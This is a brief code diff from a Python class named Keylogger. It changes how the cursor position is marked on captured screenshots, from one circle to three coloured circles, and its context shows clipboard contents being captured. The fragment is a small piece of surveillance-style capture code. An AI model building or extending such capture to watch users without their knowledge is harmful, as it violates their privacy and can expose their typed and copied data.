@@ -126,7 +126,9 @@ class Keylogger(object):
                 self.captured_pasting.append(clipboard_content)
 
     def _mark_mouse_position(self, screenshot, mouse_x, mouse_y):
-        ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(0, 0, 255))
+        ImageDraw.Draw(screenshot).ellipse([mouse_x - 30, mouse_y - 30, mouse_x + 30, mouse_y + 30], fill=(0, 255, 0))
+        ImageDraw.Draw(screenshot).ellipse([mouse_x - 20, mouse_y - 20, mouse_x + 20, mouse_y + 20], fill=(0, 0, 255))
+        ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(255, 255, 0))
 
         return screenshot
 
